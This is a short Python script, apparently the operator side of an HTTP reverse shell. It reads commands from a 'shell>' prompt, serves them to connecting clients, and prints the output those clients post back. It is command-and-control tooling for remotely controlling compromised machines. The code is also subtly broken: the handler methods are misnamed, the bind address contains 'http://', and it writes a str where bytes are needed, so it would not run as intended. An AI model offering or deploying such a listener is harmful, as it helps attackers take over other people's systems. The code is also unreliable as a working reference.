#!/usr/bin/python

from http.server import BaseHTTPRequestHandler, HTTPServer

hostname = 'http://192.168.1.10'
port = 80

class attackHandler(BaseHTTPRequestHandler):

    def httpGET(s):

        command = input("shell> ")
        s.send_response(200)
        s.send_header("Content-type", "text/html")
        s.end_headers()
        s.wfile.write(command)

    def httpPost(s):

        s.send_response(200)
        s.end_headers()
        length = int(s.headers["Content-Length"])

        postVar = s.rfile.read(length)
        print(postVar)

if __name__ == '__main__':

    server_class = HTTPServer
    httpd = server_class((hostname, port), attackHandler)

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("[-] Server is unexpectedly terminated the connection")
        httpd.server_close()
